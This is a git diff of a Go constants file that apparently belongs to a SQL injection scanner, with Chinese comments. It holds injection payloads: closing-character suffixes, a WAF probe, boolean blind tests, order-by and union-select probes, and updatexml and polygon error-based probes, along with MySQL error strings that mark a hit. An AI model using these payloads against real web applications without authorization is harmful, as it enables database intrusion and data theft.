@@ -1,11 +1,11 @@
-package str
+package constant
 
 var (
 	// SuffixList 可能的闭合符号
 	SuffixList = []string{"%20", "%27", "%22", "%29", "%27%29", "%22%29"}
 )
 
-const (
+var (
 	// DetectWafPayload 检测WAF的Payload
 	DetectWafPayload = "'%20or%201=1--+"
 	// BlindDetectTruePayload 盲注正确检测
@@ -14,8 +14,10 @@ const (
 	BlindDetectFalsePayload = "%20and%20length(database())>10000%20--+"
 	// SuffixCondition 检测闭合符号的Payload
 	SuffixCondition = "%20--+"
-	// SuffixPayload 检测闭合符号的Payload
-	SuffixPayload = "%20Or%20'SQLMaP'='SQLMaP'%20--+"
+	// SuffixTruePayload 检测闭合符号的Payload
+	SuffixTruePayload = "%20And%208408=8408%20--+"
+	// SuffixFalsePayload 检测闭合符号的Payload
+	SuffixFalsePayload = "%20AnD%208048=8804%20--+"
 	// DetectedKeyword 检测到注入的关键字
 	DetectedKeyword = "You have an error in your SQL syntax"
 	// Annotator 注释符
@@ -29,7 +31,7 @@ const (
 )
 
 // Union Select部分的常量
-const (
+var (
 	// OrderKeyword 检测OrderBy语句的关键字
 	OrderKeyword = "Unknown column"
 	// UnionSelectOrderPayload 检测OrderBy的Payload
@@ -41,7 +43,7 @@ const (
 )
 
 // Error Based部分的常量
-const (
+var (
 	// UpdatexmlFunc 报错注入检测函数
 	// 这个报错函数在后续利用中较麻烦，所以采用Polygon做后续
 	UpdatexmlFunc = "updatexml()"
@@ -56,7 +58,7 @@ const (
 )
 
 // 报错注入另一种（不稳定）
-const (
+var (
 	// PolygonErrorKeyword 报错回显的关键字
 	PolygonErrorKeyword = "Illegal non geometric"
 	// PolygonVersionPayload 报错注入获得版本
